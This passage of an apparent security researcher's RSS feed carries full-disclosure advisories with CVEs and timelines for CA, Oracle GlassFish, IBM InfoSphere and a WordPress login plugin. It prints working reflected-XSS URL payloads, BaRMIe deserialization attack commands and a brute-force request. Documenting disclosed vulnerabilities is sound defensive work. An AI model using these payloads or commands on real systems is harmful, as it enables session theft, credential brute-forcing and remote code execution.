input.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;http://hostname:7077/cgi/nhWeb&#34;&gt;http://hostname:7077/cgi/nhWeb&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameter:&lt;/strong&gt; report&lt;/li&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;http://hostname:7077/aviewbin/filtermibobjects.pl&#34;&gt;http://hostname:7077/aviewbin/filtermibobjects.pl&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameter:&lt;/strong&gt; namefilter&lt;/li&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;http://hostname:7077/aviewbin/query.pl&#34;&gt;http://hostname:7077/aviewbin/query.pl&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameter:&lt;/strong&gt; System, SystemText, Group, GroupText&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;Payload used to exploit the vulnerability:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;http://hostname:7077/cgi/nhWeb?func=myHealthSelectRpt&amp;amp;editReportName=&amp;amp;rptPid=&amp;amp;report=tlrb3&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert`1`&amp;lt;/script&amp;gt;r6hdb&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/ef9b0db927491691bfd08b30a441c257.png&#34; alt=&#34;3 - XSS (1)&#34; /&gt;&lt;/p&gt;&lt;p&gt;The XSS payload gets reflected to the screen.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/5493021dc886e61d6c896f302e860a97.png&#34; alt=&#34;3 - XSS (2)&#34; /&gt;&lt;/p&gt;&lt;p&gt;Another XSS payload that gets reflected to the screen:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;http://hostname:7077/aviewbin/query.pl?Reports=Select+Query&amp;amp;Applications=Select+Application&amp;amp;Configuration=Self+Monitoring&amp;amp;System=Select%20Systemmg8sl%20accesskey%3dx%20onclick%3dalert(1)%2f%2fh3s5gii0z5t&amp;amp;SystemText=&amp;amp;Group=Select+Group&amp;amp;GroupText=&amp;amp;Run-MIB.x=19&amp;amp;Run-MIB.y=18&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, click on hidden field &lt;code&gt;[target]&lt;/code&gt;:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/50758e6b945b415f5eda5b33a9f733b1.png&#34; alt=&#34;3 - XSS (3)&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue an attacker is able to target an application user with several type of direct or indirect impacts such as, credentials stealing, integrity compromising and different type of phishing attacks. This type of reflected XSS does require user interaction.&lt;/p&gt;&lt;h3 id=&#34;5-improper-restriction-of-excessive-authentication-attempts-missing-rate-limit-on-login-page-cwe-307&#34;&gt;&lt;strong&gt;5 - Improper Restriction of Excessive Authentication Attempts (Missing Rate Limit on login page) - CWE-307&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; A malicious user is not limited or blocked to perform a brute force attack in the main application login page.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; No special configuration is required to reproduce the issue.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28248&#34;&gt;CVE-2021-28248&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-28248&#34;&gt;&lt;strong&gt;7.5&lt;/strong&gt; (High)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;A malicious user is able to brute force user credentials without any rate limitation or filtering. In this PoC, the user is able to send at least 100 wrong passwords, and then submitting the correct one.&lt;br /&gt;Furthermore, in the default configuration, the account does not get locked.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;http://hostname/web/frames/&#34;&gt;http://hostname/web/frames/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payload used.&lt;/p&gt;&lt;p&gt;Payload used to exploit the vulnerability:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;GET /web/frames/ HTTP/1.1Host: hostname:7077User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://hostname:7077/bin/welcome.shConnection: closeCookie: JSESSIONID=&amp;lt;REDACTED&amp;gt;; JSESSIONID=&amp;lt;REDACTED&amp;gt;Upgrade-Insecure-Requests: 1Authorization: Basic &amp;lt;REDACTED&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Attack configuration and execution:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/8b31673c0715ae344e092cf1f7605c17.png&#34; alt=&#34;5 - Brute force attack&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue, an attacker with a reasonable amount of time might be able to obtain user credentials of the application, without user interaction and notification.&lt;/p&gt;&lt;h2 id=&#34;timeline&#34;&gt;Timeline&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;07/08/2020&lt;/strong&gt;: First disclosure to CA PSIRT Team ca.psirt@broadcom.com.&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;07/08/2020&lt;/strong&gt;: Human acknowledge e-mail from CA PSIRT Team.&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;09/09/2020&lt;/strong&gt;: Ping request to CA PSIRT Team for news.&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;24/09/2020&lt;/strong&gt;: CA PSIRT Team reports that the product is out of support and they no longer provide fixes or security bulletins for this version. Almost 2 months passed&amp;hellip; Looks their product catalog is quite big 😅&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;25/01/2021&lt;/strong&gt;: After some research on MITRE processes, we&amp;rsquo;ve communicated to CA PSIRT Team that we will request the CVE to MITRE using the CNA of Last Resort.&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;02/02/2021&lt;/strong&gt;: I am releasing the full disclosure to assist the MITRE analysis.&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;02/02/2021&lt;/strong&gt;: Requested the CVE to MITRE using the CNA of Last Resort (CNA-LR). It is the one to use when the vendor does not recognize the issue because of the end-of-life reason.&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;12/03/2021&lt;/strong&gt;: MITRE published the 5 CVEs.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;29/03/2021&lt;/strong&gt;: NVD scored &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-28249&#34;&gt;CVE-2021-28249&lt;/a&gt; as &lt;strong&gt;8.8&lt;/strong&gt; (High), &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-28246&#34;&gt;CVE-2021-28246&lt;/a&gt; as &lt;strong&gt;7.8&lt;/strong&gt; (High), &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-28250&#34;&gt;CVE-2021-28250&lt;/a&gt; as &lt;strong&gt;7.8&lt;/strong&gt; (High), &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-28247&#34;&gt;CVE-2021-28247&lt;/a&gt; as &lt;strong&gt;5.4&lt;/strong&gt; (Medium) and &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-28248&#34;&gt;CVE-2021-28248&lt;/a&gt; as &lt;strong&gt;7.5&lt;/strong&gt; (High).&lt;/li&gt;&lt;/ul&gt;</description>
     </item>
   
     <item>
       <title>Oracle GlassFish Server - Reflected Cross-site Scripting</title>
       <link>https://n4nj0.github.io/advisories/oracle-glassfish-reflected-xss/</link>
       <pubDate>Tue, 26 Jan 2021 12:01:00 +0100</pubDate>
       
       <guid>https://n4nj0.github.io/advisories/oracle-glassfish-reflected-xss/</guid>
       <description>&lt;h2 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h2&gt;&lt;p&gt;Multiple Reflected XSS vulnerabilities are found inside the administration panel of Oracle GlassFish.&lt;br /&gt;Full credits are for security researcher Francesco Giordano (&lt;a href=&#34;https://linkedin.com/in/0xzeta&#34;&gt;https://linkedin.com/in/0xzeta&lt;/a&gt;).&lt;/p&gt;&lt;h2 id=&#34;product-information&#34;&gt;Product Information&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Product name:&lt;/strong&gt; Oracle GlassFish Server&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Affected versions:&lt;/strong&gt; &amp;lt;= 3.1.2.18&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Product Web Page:&lt;/strong&gt; &lt;a href=&#34;https://www.oracle.com/middleware/technologies/glassfish-server.html&#34;&gt;https://www.oracle.com/middleware/technologies/glassfish-server.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Vulnerability Name:&lt;/strong&gt; Reflected Cross-site Scripting (CWE-79)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The &lt;strong&gt;Oracle GlassFish Server&lt;/strong&gt; product features a search function at &lt;strong&gt;logViewer.jsf&lt;/strong&gt;, which is an administrative interface function. There are 4 parameters on the search function that are vulnerable to Reflected XSS.&lt;/p&gt;&lt;p&gt;If the user visits the URL constructed by the attacker, then the attacker&amp;rsquo;s script executes in the user&amp;rsquo;s browser, in the context of that user&amp;rsquo;s session with the application. At that point, the script can carry out any action, and retrieve any data, to which the user has access.&lt;/p&gt;&lt;p&gt;We tried to contact Oracle Security team, but they do not recognize the security issue because the product is end-of-life. I am releasing the full disclosure for the reason I believe, which is that users have to be informed to make appropriate decisions, especially those who cannot afford an upgrade for several reasons.&lt;/p&gt;&lt;p&gt;It is recommended to update to the latest version.&lt;/p&gt;&lt;h2 id=&#34;vulnerability-details&#34;&gt;Vulnerability Details&lt;/h2&gt;&lt;h3 id=&#34;reflected-cross-site-scripting-cwe-79&#34;&gt;&lt;strong&gt;Reflected Cross-site Scripting (CWE-79)&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; An authenticated remote user is able to inject arbitrary web script or HTML due to incorrect sanitization of user-supplied data and achieve a Reflected Cross-Site Scripting attack against the platform administrators.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; None.&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;step-by-step-instructions-and-poc&#34;&gt;Step-by-step instructions and PoC&lt;/h2&gt;&lt;p&gt;A malicious user can cause an administrator user to supply dangerous content to the vulnerable page, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints:&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;http://localhost:4848/common/logViewer/logViewer.jsf&#34;&gt;http://localhost:4848/common/logViewer/logViewer.jsf&lt;/a&gt;&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameters:&lt;/strong&gt;&lt;ul&gt;&lt;li&gt;propertyForm%3ApropertyContentPage%3ApropertySheet%3ApropertSectionTextField%3AtimeStampProp%3AfromDate&lt;/li&gt;&lt;li&gt;propertyForm%3ApropertyContentPage%3ApropertySheet%3ApropertSectionTextField%3AtimeStampProp%3AfromTime&lt;/li&gt;&lt;li&gt;propertyForm%3ApropertyContentPage%3ApropertySheet%3ApropertSectionTextField%3AtimeStampProp%3AtoDate&lt;/li&gt;&lt;li&gt;propertyForm%3ApropertyContentPage%3ApropertySheet%3ApropertSectionTextField%3AtimeStampProp%3AtoTIme&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;While the administrator user is logged in to GlassFish, visit the page in the payload section.&lt;/p&gt;&lt;p&gt;Execution of the JavaScript payload in the browser context:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/c8d30ba07f0fd8f190d747df9ff3692c.jpg&#34; alt=&#34;Reflected XSS&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue an attacker is able to target administrator users who are able to access the plugin configuration page within the browser with several type of direct or indirect impacts such as stealing cookies (if the HttpOnly flag is missing from the session cookies), modifying a web page, capturing clipboard contents, keylogging, port scanning, dynamic downloads and other attacks. This type of reflected XSS does require user interaction.&lt;/p&gt;&lt;h2 id=&#34;timeline&#34;&gt;Timeline&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;05/10/2020&lt;/strong&gt;: First disclosure to Oracle Security Alerts Team secalert_us@oracle.com.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;05/10/2020&lt;/strong&gt;: Oracle Security Alerts Team reports that the product is out of support and they no longer provide fixes or security bulletins for this version. Very fast 😱&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;25/01/2021&lt;/strong&gt;: After some research on MITRE processes, we&amp;rsquo;ve communicated to Oracle Security Alerts that we will request the CVE to MITRE using the CNA of Last Resort.&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;25/01/2021&lt;/strong&gt;: Oracle Security Alerts Team replies to let them know if a CVE is assigned. Consistently very fast 😱😱&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;26/01/2021&lt;/strong&gt;: I am releasing the full disclosure to assist the MITRE analysis.&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;26/01/2021&lt;/strong&gt;: Requested the CVE to MITRE using the CNA of Last Resort (CNA-LR). It is the one to use when the vendor does not recognize the issue because of the end-of-life reason.&lt;br /&gt;&lt;/li&gt;&lt;/ul&gt;</description>
     </item>
   
     <item>
       <title>IBM InfoSphere Information Server - Java Deserialization</title>
       <link>https://n4nj0.github.io/advisories/ibm-infosphere-java-deserialization/</link>
       <pubDate>Mon, 18 Jan 2021 15:33:31 +0100</pubDate>
       
       <guid>https://n4nj0.github.io/advisories/ibm-infosphere-java-deserialization/</guid>
       <description>&lt;h2 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h2&gt;&lt;p&gt;A Java Deserialization vulnerability is found on IBM InfoSphere Information Server 8.5.0.0.&lt;br /&gt;The vulnerability allows a remote attacker to fully compromise the operating system remotely, by using the specialized tool &lt;a href=&#34;https://github.com/NickstaDB/BaRMIe&#34;&gt;&lt;strong&gt;BarMIe&lt;/strong&gt;&lt;/a&gt;.&lt;br /&gt;Full credits are for security researchers Damiano Proietti, Davide De Rubeis and Matteo Brutti.&lt;/p&gt;&lt;h2 id=&#34;product-information&#34;&gt;Product Information&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Product name:&lt;/strong&gt; IBM InfoSphere Information Server&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Affected version:&lt;/strong&gt; 8.5.0.0&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Product Web Page:&lt;/strong&gt; &lt;a href=&#34;https://www.ibm.com/it-it/analytics/information-server&#34;&gt;https://www.ibm.com/it-it/analytics/information-server&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Vulnerability Name:&lt;/strong&gt; Deserialization of Untrusted Data (CWE-502)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The &lt;strong&gt;IBM Info Sphere Information Server&lt;/strong&gt; product features the &lt;strong&gt;JReport service&lt;/strong&gt;, which is a Java service that does not make sure that the content of Java objects being deserialized is safe. In this way it has been possible to exploit malicious objects to obtain a remote command execution on the machine that hosts the product.&lt;br /&gt;By using an RMI enumeration tool it is possible to identify the fact that the port that exposed the JReport service is vulnerable to such an attack.&lt;/p&gt;&lt;p&gt;We tried to contact IBM PSIRT security team, but they do not recognize the security issue because the product is end-of-life. I am releasing the full disclosure for the reason I believe, which is that users have to be informed to make appropriate decisions, especially those who cannot afford an upgrade for several reasons.&lt;/p&gt;&lt;p&gt;It is recommended to update to the latest version, disable the JReport service, or at least enforce the firewall rules to that vulnerable service port.&lt;/p&gt;&lt;h2 id=&#34;vulnerability-details&#34;&gt;Vulnerability Details&lt;/h2&gt;&lt;h3 id=&#34;deserialization-of-untrusted-data-cwe-502&#34;&gt;&lt;strong&gt;Deserialization of Untrusted Data (CWE-502)&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; When the JReport service is enabled as a web service, it is possible to create and send malicious Java objects to obtain a remote command execution on the remote target.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; The JReport service needs to be enabled on InfoSphere.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27583&#34;&gt;CVE-2020-27583&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-27583&#34;&gt;&lt;strong&gt;9.8&lt;/strong&gt; (Critical)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;step-by-step-instructions-and-poc&#34;&gt;Step-by-step instructions and PoC&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;RMI Vulnerability Enumeration&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;The JReport service exposing objects via an RMI registry is found on port &lt;strong&gt;58611&lt;/strong&gt;.&lt;br /&gt;The following command can be used to enumerate the target:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;java -jar BaRMIe_v1.01.jar -enum &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/06474716ff013e0af6faffaaa744f034.png&#34; alt=&#34;Target enumeration&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;RMI Vulnerability Exploitation&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;The following command can be used to attack the target:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;java -jar BaRMIe_v1.01.jar -attack &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/2a07052b70809a76a9c0974095a84332.png&#34; alt=&#34;Target attack (1)&#34; /&gt;&lt;/p&gt;&lt;p&gt;The BaRMIe tool uses the Apache Commons collection software as a vector for the bind() method.&lt;/p&gt;&lt;p&gt;The &lt;strong&gt;Registry.bind()&lt;/strong&gt; method in the Java version used by JReport does not validate the type of the parameter before deserializing it, so it is possible to alter one of the parameters used. This lack of validation allows the use of a crafted payload, which issues commands to the host server, after being deserialized.&lt;/p&gt;&lt;p&gt;It is possible to enter the target information interactively, when requested by the tool.&lt;br /&gt;In this case, the payload used is the creation of a file in the &lt;code&gt;/tmp&lt;/code&gt; folder of the server, but the tool itself cannot verify the successful attack.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/6d460a37859d8ec89e3ddf566dca8feb.png&#34; alt=&#34;Target attack (2)&#34; /&gt;&lt;/p&gt;&lt;p&gt;By logging to the target machine, it is verified that the file is created in the &lt;code&gt;/tmp&lt;/code&gt; folder, so the RCE is successful.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/9948067b4673bec9cd195e88dcb1e169.png&#34; alt=&#34;Attack validation&#34; /&gt;&lt;/p&gt;&lt;p&gt;To remotely compromise the target, it is possible to upload and execute a simple python reverse shell.&lt;br /&gt;After getting root access via the exploit, it is found that the parent process which is using the vulnerable JReport service is IBM Info Sphere.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/cac06513851b722ff5888820faaf16af.png&#34; alt=&#34;Searching for the PID of JReport service&#34; /&gt;&lt;/p&gt;&lt;p&gt;It is confirmed that the vulnerable version is 8.5.0.0.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/0c60919ccb851298ac8fb611d33f24f0.png&#34; alt=&#34;Vulnerable version&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue an attacker is able to execute commands with the privilege of the web service, which is running as root in this case. With this privilege level, an attacker can access to any kind of sensitive data and perform any kind of malicious activity with the affected target.&lt;/p&gt;&lt;h2 id=&#34;timeline&#34;&gt;Timeline&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;31/07/2020&lt;/strong&gt;: First disclosure IBM PSIRT Team psirt@us.ibm.com.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;31/07/2020&lt;/strong&gt;: Automatic acknowledge e-mail from IBM PSIRT Team. Nice to have 😊&lt;/li&gt;&lt;li&gt;&lt;strong&gt;24/08/2020&lt;/strong&gt;: Ping request to IBM PSIRT Team for news.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;26/08/2020&lt;/strong&gt;: IBM PSIRT Team reports that the product is out of support since 2016 and they no longer provide fixes or security bulletins for this version.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;20/10/2020&lt;/strong&gt;: Requested the CVE to MITRE using the CNA of Last Resort (CNA-LR). It is the one to use when the vendor does not recognize the issue because of the end-of-life reason.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;20/11/2020&lt;/strong&gt;: MITRE assigned in reserved state.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;18/01/2021&lt;/strong&gt;: As a lot of time passed from our first notification, I am releasing the full disclosure.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;21/01/2021&lt;/strong&gt;: MITRE release the reservation for the CVE ID.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;26/01/2021&lt;/strong&gt;: NVD sored the CVE as 9.8 (Critical).&lt;/li&gt;&lt;/ul&gt;</description>
     </item>
   
     <item>
       <title>WordPress Plugin Limit Login Attempts Reloaded - Multiple Vulnerabilities</title>
       <link>https://n4nj0.github.io/advisories/wordpress-plugin-limit-login-attempts-reloaded/</link>
       <pubDate>Mon, 14 Dec 2020 18:18:31 +0100</pubDate>
       
       <guid>https://n4nj0.github.io/advisories/wordpress-plugin-limit-login-attempts-reloaded/</guid>
       <description>&lt;h2 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1 - Rate Limit Bypass&lt;/strong&gt;: In a non-standard configuration, the client IP header accepts any arbitrary string. When randomizing the header input, the login count does never reach the maximum allowed retries.&lt;br /&gt;&lt;strong&gt;2 - Reflected XSS&lt;/strong&gt;: When logged as WordPress administrator, the &lt;strong&gt;tab&lt;/strong&gt; URL parameter in &lt;em&gt;/wp-admin/options-general.php?page=limit-login-attempts&lt;/em&gt;&lt;/p&gt;&lt;h2 id=&#34;plugin-information&#34;&gt;Plugin Information&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Plugin name:&lt;/strong&gt; Limit Login Attempts Reloaded&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Affected version:&lt;/strong&gt; &amp;gt;= 2.13.0&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Plugin Web Page:&lt;/strong&gt; &lt;a href=&#34;https://wordpress.org/plugins/limit-login-attempts-reloaded/&#34;&gt;https://wordpress.org/plugins/limit-login-attempts-reloaded/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;This WordPress plugin is aimed to be a bruteforce attack protection mechanism, and is currently installed in more than &lt;strong&gt;1 million&lt;/strong&gt; of active installations.&lt;br /&gt;However, during a quick auditing of the plugin, I&amp;rsquo;ve found two issues. One is a rate limiting bypass under a non-default configuration, which effectively defeats the plugin purpose. The other one is an unauthenticated reflected XSS.&lt;br /&gt;We tried to contact the WordPress plugin team and the developer directly, but received no response. As of today, the vulnerabilities are fixed, so I am releasing the full disclosure.&lt;br /&gt;It is recommended to update to the latest version.&lt;/p&gt;&lt;h2 id=&#34;vulnerability-details&#34;&gt;Vulnerability Details&lt;/h2&gt;&lt;h3 id=&#34;1-improper-restriction-of-excessive-authentication-attempts-rate-limit-bypass-on-login-page-cwe-307&#34;&gt;&lt;strong&gt;1 - Improper Restriction of Excessive Authentication Attempts (Rate Limit Bypass on login page) - CWE-307&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; When the plugin is configured to accept an arbitrary header as client source IP address, a malicious user is not limited to perform a brute force attack, because the client IP header accepts any arbitrary string. When randomizing the header input, the login count does never reach the maximum allowed retries.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; The plugin needs to be installed and activated on WordPress. On plugin settings page, the &lt;em&gt;Trusted IP Origins&lt;/em&gt; has to be configured for an arbitrary header, for example &lt;em&gt;X-Forwarded-For&lt;/em&gt;.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35590&#34;&gt;CVE-2020-35590&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-35590&#34;&gt;&lt;strong&gt;9.8&lt;/strong&gt; (Critical)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;A necessary prerequisite is to configure a custom header on the plugin settings page, in the &lt;em&gt;Trusted IP Origins&lt;/em&gt;, including for example &lt;em&gt;X-Forwarded-For&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;The configuration page can be as the following picture:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/3fee03c44d3491ae26a6c5a1897f43e7.png&#34; alt=&#34;Required configuration&#34; /&gt;&lt;/p&gt;&lt;p&gt;Please note that in some networking scenarios this configuration is possible. Indeed, there might be present load balancers or reverse proxies in front of the WordPress instance.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;http://hostname/wp-login.php&#34;&gt;http://hostname/wp-login.php&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameter:&lt;/strong&gt; X-Forwarded-For&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;In normal condition, when there is no custom &lt;em&gt;Trusted IP Origin&lt;/em&gt; header configured, or if the header value is always the same value, an attacker is &lt;strong&gt;not&lt;/strong&gt; able to perform an attack, because the login limit is enforced by the plugin.&lt;/p&gt;&lt;p&gt;Indeed, the classic password only brute force is blocked, as depicted by the following pictures:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/10cee3515c3a26d67e8b1e6dc8e089ab.png&#34; alt=&#34;Required configuration&#34; /&gt;&lt;/p&gt;&lt;p&gt;The attacker can use a word list in the password value:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/9409c50002dfff8cf4ae26db2572af40.png&#34; alt=&#34;Required configuration&#34; /&gt;&lt;/p&gt;&lt;p&gt;After few attempts, the plugin in the default configuration successfully stops the attacker:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/62528178fd67b903a87751ef2db26ca0.png&#34; alt=&#34;Required configuration&#34; /&gt;&lt;/p&gt;&lt;p&gt;However, the &lt;strong&gt;X-Forwarded-For&lt;/strong&gt; value is not validated to be an IP address or an array of IP addresses (some load balancers could use a comma-separated list as value).&lt;/p&gt;&lt;p&gt;Indeed, if a malicious user adds the &lt;strong&gt;X-Forwarded-For&lt;/strong&gt; header on the login request, can test for the authentication rate limit bypass.&lt;/p&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payload used.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/83bd20eddaeb475c56244b2fe63cb365.png&#34; alt=&#34;Required configuration&#34; /&gt;&lt;/p&gt;&lt;p&gt;The first set of values is the word list used for testing the password 